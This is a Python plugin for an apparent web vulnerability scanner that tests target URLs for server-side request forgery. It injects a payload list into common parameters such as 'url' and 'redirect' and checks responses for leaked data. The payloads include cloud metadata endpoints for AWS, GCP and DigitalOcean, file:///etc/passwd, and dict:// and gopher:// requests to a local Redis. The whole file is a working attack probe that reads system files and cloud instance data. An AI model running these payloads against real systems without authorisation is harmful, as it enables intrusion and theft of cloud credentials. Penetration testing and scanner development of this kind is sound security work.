#!/usr/bin/env python3
"""plugins/ssrf.py - Detección de Server-Side Request Forgery"""

import re
from typing import Dict, List
from core.context import Context

SSRF_PAYLOADS = [
    'http://127.0.0.1:80',
    'http://localhost:80',
    'http://169.254.169.254/latest/meta-data/',  # AWS metadata
    'http://metadata.google.internal/computeMetadata/v1/',
    'http://169.254.169.254/metadata/v1/',  # DigitalOcean
    'file:///etc/passwd',
    'dict://127.0.0.1:6379/info',  # Redis
    'gopher://127.0.0.1:6379/_INFO',
]

SSRF_PATTERNS = [
    re.compile(r'AMI-ID|instance-id|ami-', re.IGNORECASE),  # AWS
    re.compile(r'project-id|zone|instance', re.IGNORECASE),  # GCP
    re.compile(r'root:x:0:0:', re.IGNORECASE),  # /etc/passwd
    re.compile(r'redis_version', re.IGNORECASE),
    re.compile(r'connected_clients', re.IGNORECASE),
]


def run(ctx: Context) -> Dict:
    """Detecta SSRF"""
    target = ctx.target
    findings = []
    
    ctx.log('info', f"Analizando SSRF en {target}")
    
    params = ctx.get('discovered_params', [])
    if not params:
        params = [
            {'url': target, 'param': 'url', 'method': 'GET'},
            {'url': target, 'param': 'uri', 'method': 'GET'},
            {'url': target, 'param': 'next', 'method': 'GET'},
            {'url': target, 'param': 'redirect', 'method': 'GET'},
            {'url': target, 'param': 'image', 'method': 'GET'},
            {'url': target, 'param': 'src', 'method': 'GET'},
        ]
    
    for param_info in params[:6]:
        if ctx.stopped:
            break
        
        url = param_info['url']
        param = param_info['param']
        method = param_info.get('method', 'GET')
        
        for payload in SSRF_PAYLOADS[:6]:
            if ctx.stopped:
                break
            
            test_url = f"{url}{'&' if '?' in url else '?'}{param}={payload}"
            
            try:
                resp = ctx.req(method, test_url, timeout=10)
                content = resp.text
                
                for pattern in SSRF_PATTERNS:
                    if pattern.search(content):
                        findings.append({
                            'type': 'ssrf',
                            'severity': 'high',
                            'title': 'Server-Side Request Forgery',
                            'detail': f"SSRF posible en parámetro '{param}'",
                            'evidence': {
                                'url': test_url,
                                'parameter': param,
                                'payload': payload,
                                'method': method,
                                'matched': pattern.pattern
                            },
                            'url': test_url
                        })
                        ctx.log('ok', f"SSRF detectado en {param}")
                        break
                        
            except Exception as e:
                ctx.log('warn', f"Error probando SSRF en {param}: {e}")
    
    return {'findings': findings}


__version__ = "1.0.0"
__author__ = "HT Team"
PHASE = "attack"
REQUIRES = ["crawler"]